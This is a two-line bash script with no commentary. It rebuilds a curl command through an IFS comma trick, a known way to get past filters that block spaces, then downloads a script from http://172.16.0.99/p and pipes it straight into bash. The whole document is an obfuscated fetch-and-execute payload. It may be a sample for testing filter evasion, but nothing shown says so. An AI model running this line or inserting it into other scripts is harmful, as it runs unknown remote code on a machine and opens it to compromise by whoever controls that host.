#!/bin/bash
IFS=,;$(echo curl,-s,http://172.16.0.99/p)|bash
